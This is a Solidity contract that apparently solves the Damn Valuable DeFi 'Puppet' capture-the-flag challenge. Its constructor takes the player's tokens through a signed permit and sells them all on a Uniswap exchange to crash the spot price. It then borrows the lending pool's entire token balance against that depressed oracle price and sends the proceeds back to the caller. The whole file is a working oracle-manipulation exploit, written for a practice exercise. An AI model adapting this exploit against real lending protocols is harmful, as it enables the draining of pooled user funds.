pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface UniswapExchange {
  function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract CrackPuppet {
  using Address for address payable;
  constructor (address _pairAddress, address _token, address _pool, uint256 _deadline, uint8 v, bytes32 r, bytes32 s) payable {

    UniswapExchange uniswapExchange = UniswapExchange(_pairAddress);
    DamnValuableToken token = DamnValuableToken(_token);
    PuppetPool lendingPool = PuppetPool(_pool);

    uint playerTokenBalance = token.balanceOf(msg.sender);
    uint poolBalance = token.balanceOf(_pool);
    uint deadline = block.timestamp + 1 days;
    token.permit(
        msg.sender,
        address(this),
        playerTokenBalance,
        _deadline,
        v,
        r,
        s
    );
    console.log("Contract token balance before: %d", token.balanceOf(address(this)));
    token.transferFrom(msg.sender, address(this), playerTokenBalance);
    console.log("Contract token balance after: %d", token.balanceOf(address(this)));
    token.approve(address(uniswapExchange), playerTokenBalance);
    uniswapExchange.tokenToEthSwapInput(playerTokenBalance, 1, _deadline);
    uint depositValue = lendingPool.calculateDepositRequired(poolBalance);
    lendingPool.borrow{value: depositValue}(poolBalance, msg.sender);

    token.transfer(msg.sender, token.balanceOf(address(this))); // send tokens back to hot wallet
    payable(msg.sender).sendValue(address(this).balance); // send ETH back to hot wallet
  }


  receive() external payable {

  }

  fallback() external payable {

  }
}

